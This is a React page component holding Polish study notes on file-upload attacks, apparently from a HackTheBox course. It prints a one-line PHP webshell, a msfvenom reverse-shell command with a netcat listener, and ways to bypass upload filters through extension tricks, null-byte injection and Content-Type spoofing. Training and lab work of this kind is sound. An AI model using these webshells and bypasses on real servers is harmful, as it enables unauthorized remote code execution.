import { Link } from 'react-router-dom';
import file_upload_identyfication from '../../../assets/file_upload_identyfication.png';
import file_upload_request from '../../../assets/file_upload_request.png';
import file_upload_request_changed from '../../../assets/file_upload_request_changed.png';
import file_upload_fuzz_extenction from '../../../assets/file_upload_fuzz_extenction.png';
import file_upload_fuzz_extenction_result from '../../../assets/file_upload_fuzz_extenction_result.png';
import file_upload_white_list from '../../../assets/file_upload_white_list.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const FileUpload = () => {

    return(
        <section>
            <h1>File upload</h1>
            <p>Identyfikujemy jakie frameworki działają w aplikacji</p>
            <ExampleFrame screen={file_upload_identyfication}/>
            <p>Zatem możemy stworzyć plik test.php <span className='important'>{'<?php echo "Hello HTB";?>'}</span></p>
            <p>Po czym uruchomić plik wchodząc do pliku np: <span className='important'>http://SERVER_IP:PORT/uploads/test.php</span></p>

            <p>Prosty webshell <span className='important'>{"<?php system(`$_REQUEST['cmd']`); ?>"}</span></p>
            <p className='important'>http://SERVER_IP:PORT/uploads/shell.php?cmd=id</p>

            <hr />

            <h3>Reverse shell msfvenom</h3>
            <p className='important'>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw {'>'} reverse.php</p>
            <p>Nasłuchiwanie <span className='important'>nc -lvnp OUR_PORT</span></p>

            <hr />

            <h3>Wyłączenie walidacji po stronie Frontend</h3>
            <p>W inpucie modyfikujemy DOM (HTML) atrybut accept</p>
            <p className='important'>{'<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">'}</p>

            <hr />

            <h3>Modyfikacja zapytania Backend</h3>
            <p>Dodajemy zdjęcie i przechwytujemy request w burp</p>
            <ExampleFrame screen={file_upload_request}/>
            <p>W ten sposób możemy teraz zmodyfikować to żądanie, aby spełnić nasze potrzeby, bez ograniczeń związanych z walidacją typu frontonu. Jeśli serwer zaplecza nie zweryfikuje przesłanego typu pliku, teoretycznie powinniśmy być w stanie wysłać dowolny typ pliku/treść i zostanie on przesłany na serwer.</p>
            <p>Dwie ważne części żądania to nazwa_pliku="HTB.png" i zawartość pliku na końcu żądania. Jeśli zmodyfikujemy nazwę pliku na Shell.php i zmodyfikujemy zawartość do powłoki internetowej, której używaliśmy w poprzedniej sekcji; zamiast obrazu przesyłalibyśmy powłokę internetową PHP.</p>
            <ExampleFrame screen={file_upload_request_changed}/>
            <div className='waring'>
                <p>Uwaga: Możemy również zmodyfikować <span className='important'>Content-type</span> zawartości przesyłanego pliku, chociaż na tym etapie nie powinno to odgrywać istotnej roli, dlatego pozostawimy go bez modyfikacji.</p>
            </div>

            <hr />

            <h3>Generalnie istnieją dwie popularne formy sprawdzania poprawności rozszerzenia pliku na zapleczu:</h3>
            <ul>
                <li>Testowanie na czarnej liście typów
                    <p>Ponadto w ramach walidacji można również sprawdzić typ pliku lub zawartość pliku pod kątem dopasowania typu. Najsłabszą formą sprawdzania poprawności jest sprawdzenie rozszerzenia pliku na czarnej liście rozszerzeń w celu ustalenia, czy żądanie przesyłania powinno zostać zablokowane. </p>
                </li>
                <li>Testowanie na białej liście typów</li>
            </ul>

            <div className='waring'>
                <p>Wskazówka: w powyższym porównaniu uwzględniana jest również wielkość liter i uwzględniane są tylko rozszerzenia małymi literami. Na serwerach Windows w nazwach plików nie jest rozróżniana wielkość liter, więc możemy spróbować przesłać plik php z mieszaną wielkością liter (np. pHp), co może również ominąć czarną listę i nadal powinno być wykonywane jako skrypt PHP.</p>
            </div>

            <hr />

            <h3>Fuzzing rozszerzenia</h3>
            <p>Można skorzystać z wielu list np:</p>
            <Link to='https://github.com/FilipowiczP/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst'>Lista PHP</Link>
            <Link to='https://github.com/FilipowiczP/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt'>Ogólna lista rozszerzeń</Link>
            <ExampleFrame screen={file_upload_fuzz_extenction}/>
            <ExampleFrame screen={file_upload_fuzz_extenction_result}/>
            <p>W przypadku białej listy otrzymujemy błąd <span className='waring'>Only images are allowed</span></p>
            <ExampleFrame screen={file_upload_white_list}/>
            <p>Wszystkie rozszerzenia PHP zostały zablokowane</p>
            
            <hr />

            <h3>Podwójne rozszerzenie</h3>
            <p>Na przykład, jeśli rozszerzenie .jpg było dozwolone, możemy dodać je do nazwy przesyłanego pliku i nadal kończyć nazwę pliku na .php (np. Shell.jpg.php), w takim przypadku powinniśmy przejść test białej listy, jednocześnie przesyłając skrypt PHP, który może wykonać kod PHP</p>

            <hr />

            <h3>Podwójne odwrócone rozszerzenie</h3>
            <p>W niektórych przypadkach sama funkcja przesyłania plików może nie być podatna na ataki, ale konfiguracja serwera WWW może prowadzić do takiej luki. Na przykład organizacja może korzystać z aplikacji internetowej typu open source, która ma funkcję przesyłania plików. Nawet jeśli funkcja przesyłania plików korzysta ze ścisłego wzorca wyrażenia regularnego, który pasuje tylko do końcowego rozszerzenia nazwy pliku, organizacja może używać niepewnych konfiguracji serwera WWW.
                Na przykład plik <span className='important'>/etc/apache2/mods-enabled/php7.4.conf dla serwera WWW Apache2</span> może zawierać nas</p>
            <div className='waring'>
                <p>{`<FilesMatch ".+\.ph(ar|p|tml)">`}</p>
                <p className='tab-1'>{`SetHandler application/x-httpd-php`}</p>
                <p>{`</FilesMatch>`}</p>
            </div>
            <p>Powyższa konfiguracja pokazuje, w jaki sposób serwer WWW określa, które pliki umożliwiają wykonanie kodu PHP. Określa białą listę ze wzorcem wyrażenia regularnego pasującym do <span className='important'>.phar, .php i .phtml. </span>Jednak ten wzór wyrażenia regularnego może zawierać ten sam błąd, który widzieliśmy wcześniej, jeśli zapomnimy zakończyć go znakiem ($). W takich przypadkach dowolny plik zawierający powyższe rozszerzenia będzie mógł wykonać kod PHP, nawet jeśli nie będzie kończył się rozszerzeniem PHP. Na przykład nazwa pliku (<span className='important'>shell.php.jpg</span>) powinna przejść wcześniejszy test białej listy, ponieważ kończy się na (<span className='important'>.jpg</span>), i będzie mogła wykonać kod PHP z powodu powyższej błędnej konfiguracji, ponieważ zawiera (<span className='important'>.php</span>) w jego imieniu.</p>
        
            <p>metodę ominięcia testu sprawdzającego białą listę poprzez <span className='important'>wstrzykiwanie znaków</span>. Możemy wstawić kilka znaków przed lub po ostatecznym rozszerzeniu, aby aplikacja internetowa błędnie zinterpretowała nazwę pliku i wykonała przesłany plik jako skrypt PHP. Poniżej znajdują się niektóre znaki, które możemy spróbować wstrzyknąć:</p>
            <ul className='important'>
                <li>%20</li>
                <li>%0a</li>
                <li>%00</li>
                <li>%0d0a</li>
                <li>/</li>
                <li>.\</li>
                <li>.</li>
                <li>…</li>
                <li>:</li>
            </ul>
            <p>Każdy znak ma specyficzny przypadek użycia, który może oszukać aplikację internetową w celu błędnej interpretacji rozszerzenia pliku. Na przykład (<span className='important'>shell.php%00.jpg</span>) działa z serwerami PHP w wersji <span className='important'>5.X</span> lub wcześniejszej, ponieważ powoduje, że serwer WWW PHP kończy nazwę pliku po (<span className='important'>%00</span>) i zapisuje go jako (<span className='important'>shell. php</span>), jednocześnie przekazując białą listę. To samo można zastosować w przypadku aplikacji internetowych hostowanych na serwerze Windows, wstawiając dwukropek (<span className='important'>:</span>) przed dozwolonym rozszerzeniem pliku (<span className='important'>np. Shell.aspx:.jpg</span>), co powinno również zapisać plik jako (<span className='important'>shell.aspx</span>). Podobnie każdy z pozostałych znaków ma przypadek użycia, który może pozwolić nam na przesłanie skryptu PHP z pominięciem testu sprawdzającego typ.</p>
        
            <hr />

            <h3>Content-Type</h3>
            <Link to='https://github.com/FilipowiczP/SecLists/blob/master/Miscellaneous/Web/content-type.txt'>Lista content-types</Link>
            <div className='waring'>
                <p>Możemy ją zminiejszyć poprzez wyciągnięcie z niej tylko wyznaczone typy np: <span className='important'>{`cat content-type.txt | grep 'image/' > image-content-types.txt`}</span></p>
            </div>
            <div className='waring'>
                <p>Uwaga: Żądanie HTTP przesyłania pliku ma dwa nagłówki Content-Type, jeden dla dołączonego pliku (na dole) i jeden dla pełnego żądania (na górze). Zwykle musimy zmodyfikować nagłówek Content-Type pliku, ale w niektórych przypadkach żądanie będzie zawierać tylko główny nagłówek Content-Type (np. jeśli przesłana treść została wysłana jako dane POST), w takim przypadku będziemy musieli zmodyfikować główny nagłówek Nagłówek typu zawartości.</p>
            </div>
        </section>
    )
};

export default FileUpload;